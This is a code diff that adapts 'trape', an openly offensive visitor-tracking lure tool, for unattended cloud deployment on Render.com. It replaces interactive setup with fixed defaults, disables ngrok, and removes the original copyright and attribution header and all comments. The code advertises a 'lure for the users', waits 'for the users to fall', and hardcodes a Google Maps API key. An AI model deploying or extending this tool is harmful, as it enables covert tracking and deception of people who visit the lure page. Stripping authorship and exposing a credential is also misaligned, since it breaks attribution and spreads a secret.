@@ -1,16 +1,5 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-#**
-#
-#########
-# trape #
-#########
-#
-# trape depends of this file
-# For full copyright information this visit: https://github.com/jofpin/trape
-#
-# Copyright 2018 by Jose Pino (@jofpin) / <jofpin@gmail.com>
-#**
 import time
 import json
 import urllib
@@ -57,7 +46,6 @@ class Trape(object):
                 utils.Go(utils.Color['whiteBold'] + "[" + utils.Color['redBold'] + "x" + utils.Color['whiteBold'] + "]" + utils.Color['redBold'] + " " + "NOTICE: " + utils.Color['white'] + "Trape needs Internet connection for working" + "\n\t")
                 sys.exit(0)
 
-            # RENDER.COM DÜZENLEMESİ: Eğer trape.config yoksa interaktif soru sorma, varsayılan değerleri ata.
             if (not(os.path.exists("trape.config"))):
                 self.ngrok = ''
                 self.gmaps = 'AIzaSyA30wEa2DwUuddmNTHvoprhnrB2w_aCWbs'
@@ -94,8 +82,6 @@ class Trape(object):
 
             self.type_lure = 'global'
 
-            # Check current updates
-
             if options.update:
                 utils.Go("\033[H\033[J")
                 utils.Go("Updating..." + " " + utils.Color['blue'] + "trape" + utils.Color['white'] + "..." + "\n")
@@ -104,7 +90,6 @@ class Trape(object):
                 utils.Go("Trape Updated... Please execute again...")
                 sys.exit(0)
 
-            # RENDER.COM DÜZENLEMESİ: Input yerine sabit değerler atadık.
             if options.url is None:
                 utils.Go("\033[H\033[J")
                 utils.Go("----------------------------------------------")
@@ -115,20 +100,14 @@ class Trape(object):
                 
                 options.url = "https://www.google.com"
 
-            # RENDER.COM DÜZENLEMESİ: Port için input yerine Render'ın verdiği çevre değişkenini (PORT) çekiyoruz.
             if options.port is None:
                 options.port = os.environ.get('PORT', '8080')
-
-            # RENDER.COM DÜZENLEMESİ: Render'da port kontrolü yapmaya çalışırsak hata verip durabilir, bu yüzden bu döngüyü pasif hale getirdik.
-            # while utils.checkPort(int(options.port)) == False:
-            # 	options.port = os.environ.get('PORT', '8080')
 
             utils.Go("")
             utils.Go(utils.Color['greenBold'] + "-" + utils.Color['white'] + " Successful " + utils.Color['greenBold'] + "startup" + utils.Color['white'] + ", get lucky on the way!" + utils.Color['white'])
             utils.Go("")
             time.sleep(0.1)
 
-            # Yerel IP yerine Render'ın verdiği dış IP veya 0.0.0.0 kullanılacak
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 s.connect(("8.8.8.8", 80))
@@ -141,36 +120,17 @@ class Trape(object):
             if self.url_to_clone[0:4] != 'http':
                 self.url_to_clone = 'http://' + self.url_to_clone
             self.victim_path = options.url.replace("http://", "").replace("https://", "")
-
-            # RENDER.COM DÜZENTLEMESİ: Ngrok başlatma kısmı Render'da gereksiz ve hata verdiği için tamamen yorum satırı yapıldı.
-            # if (options.ngrok or (self.ngrok != "")):
-            # 	if self.ngrok == '':
-            # 		utils.Go("\033[H\033[J")
-            # 		self.ngrok = input("What is your nGrok token?" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
-            # 	if (self.ngrok != ''):
-            # 		from core.ngrok import ngrok
-            # 		import os.path as path
-            #
-            # 		v_ngrok = ngrok(self.ngrok, self.app_port, stat, self.stats_path)
-            # 	else:
-            # 		utils.Go(utils.Color['whiteBold'] + "[" + utils.Color['redBold'] + "x" + utils.Color['whiteBold'] + "]" + utils.Color['redBold'] + " " + "ERROR: " + " " + utils.Color['white'] + "Your nGrok authtoken can't be empty")
             
-            # Custom name of REST API
             if (options.injc):
                 self.injectURL = options.injc
 
-            # Custom access token	
             if (options.accesskey):
                 self.stats_key = options.accesskey
 
-
-    # Design principal of the header of trape
     def header(self):
         if self.stat == 1:
-            # Principal header of tool
             utils.banner()
 
-            # Update verification
             try:
                 changeLog = requests.get("https://raw.githubusercontent.com/jofpin/trape/master/version.txt", timeout = 4)
                 changeLog = changeLog.text.split(" ")[1]
@@ -184,7 +144,6 @@ class Trape(object):
             except Exception:
                 pass
 
-            # Local information vars	
             utils.Go(utils.Color['white'] + "\t" + utils.Color['whiteBold'] + "LOCAL INFORMATION" + utils.Text['end'])
             utils.Go("\t" + "-------------------")
             utils.Go(utils.Color['white'] + "\t" + utils.Color['green'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Lure for the users: " + utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.victim_path)
@@ -193,30 +152,21 @@ class Trape(object):
             utils.Go(utils.Color['white'] + "\t" + utils.Color['green'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Your Access key: " + utils.Color['blue'] + self.stats_key + utils.Color['white'])
             utils.Go("")
             
-            # RENDER.COM DÜZENLEMESİ: Ngrok public link kontrolü devre dışı bırakıldı (Çünkü Ngrok kullanmıyoruz).
-            # if self.ngrok != '':
-            # 	...
-            
             utils.Go("\n" + utils.Color['white'])
             utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + ">" + utils.Color['white'] + "]" + utils.Color['whiteBold'] + " " + "Start time:" + " " + utils.Color['white'] + self.date_start)
             utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "?" + utils.Color['white'] + "]" + utils.Color['white'] + " " + "Do not forget to close " + self.name_trape + ", after use. Press Control C" + " " + utils.Color['white'] + '\n')
             utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "¡" + utils.Color['white'] + "]" + utils.Color['white'] + " " + "Waiting for the users to fall..." + "\n")
 
-    # Important: in the process of use is possible that will ask for the root
     def rootConnection(self):
         pass
 
-    # Detect operating system, to compose the compatibility			
     def loadCheck(self):
         utils.checkOS()
         
-    # the main file (trape.py)
     def main(self):
         import core.sockets
 
-    # Create config file
     def trape_config(self):
-        # RENDER.COM DÜZENLEMESİ: Bu fonksiyon artık interaktif çalışmayacağı için sadece bilgi mesajı veriyor.
         utils.Go("Configuration is bypassed for cloud deployment.")
 
     def injectCSS_Paths(self, code):
@@ -228,7 +178,6 @@ class Trape(object):
         code = code.replace("[SERVICES_ICONS_HREF]", self.CSSFiles[5]['src'])
         return code
 
-# Autocompletion of console
 if "nt" in os.name:
     pass
 else:
@@ -236,7 +185,6 @@ else:
     readline.parse_and_bind("tab:complete")
     readline.set_completer(utils.niceShell)
 
-# RENDER.COM DÜZENLEMESİ: Uygulamayı başlatan ana komut bloğu eklendi.
 if __name__ == '__main__':
     trape_app = Trape(stat=1)
     trape_app.header()
